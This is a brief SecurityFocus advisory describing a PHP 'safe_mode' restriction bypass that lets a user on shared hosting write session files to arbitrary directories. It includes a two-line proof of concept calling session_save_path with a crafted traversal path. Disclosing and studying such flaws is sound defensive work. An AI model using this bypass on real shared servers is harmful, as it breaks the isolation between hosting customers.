source: http://www.securityfocus.com/bid/38182/info

PHP is prone to a 'safe_mode' restriction-bypass vulnerability. Successful exploits could allow an attacker to write session files in arbitrary directions.

This vulnerability would be an issue in shared-hosting configurations where multiple users can create and execute arbitrary PHP script code; the 'safe_mode' restrictions are assumed to isolate users from each other. 

{

session_save_path(";;/byp/;a/../../humhum");
session_start();

}
